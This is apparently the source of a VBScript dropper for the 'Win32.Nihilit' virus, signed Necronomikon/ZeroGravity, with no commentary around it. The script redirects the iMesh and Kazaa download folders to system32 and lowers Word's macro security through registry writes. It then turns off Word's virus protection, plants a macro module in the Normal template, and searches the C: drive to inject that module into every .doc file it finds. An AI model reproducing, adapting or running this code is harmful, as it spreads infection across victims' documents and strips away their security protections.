 On Error Resume Next
rem Nihilit Win32asm Version
rem (c) by Necronomikon[ZeroGravity] 
Dim WSHShell
Set n = fso.GetFile(WScript.ScriptFullName)
Set WSHShell = WScript.CreateObject("WScript.Shell")
WSHShell.RegWrite "HKEY_CURRENT_USER\SOFTWARE\iMesh\Client\LocalContent\DlDir1","system32"
WSHShell.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Kazaa\Transfer\DlDir1","system32"
WSHShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security\AccessVBOM", 1, "REG_DWORD"
WSHShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security\Level", 1, "REG_DWORD"
WSHShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security\Level", 1, "REG_DWORD"
Set Backup = WScript.CreateObject("Word.Application")
Backup.Options.VirusProtection = (Rnd * 0)
Backup.Options.SaveNormalPrompt = (Rnd * 0)
Backup.NormalTemplate.VBProject.VBComponents.Remove Backup.NormalTemplate.VBProject.VBComponents("Nihilit")
Backup.NormalTemplate.Save
Backup.NormalTemplate.VBProject.VBComponents.Import ("Nihilit.bas")
Set Search = Backup.Application.Filesearch
Search.LookIn = "C:\": Search.SearchSubFolders = True: Search.FileName = "*.doc": Search.Execute
For f = 1 To Search.FoundFiles.Count
Victim = Search.FoundFiles(f)
Backup.Documents.Open Victim
Backup.ActiveDocument.VBProject.VBComponents.Remove Backup.ActiveDocument.VBProject.VBComponents(" & VirusName & ")
Backup.ActiveDocument.VBProject.VBComponents.Import ("Nihilit.bas")
Backup.ActiveDocument.Save
Backup.ActiveDocument.Close
Next
Backup.Application.Quit
Copyright
Function Copyright()
Randomize
If 1 + Int(Rnd * 50) = 7 then
MsgBox "*** Win32.Nihilit ***" & vbcrlf & "      Copyright by" & vbcrlf & "Necronomikon/ZeroGravity", 64,"VBS.Dropper for:"
end if
end function
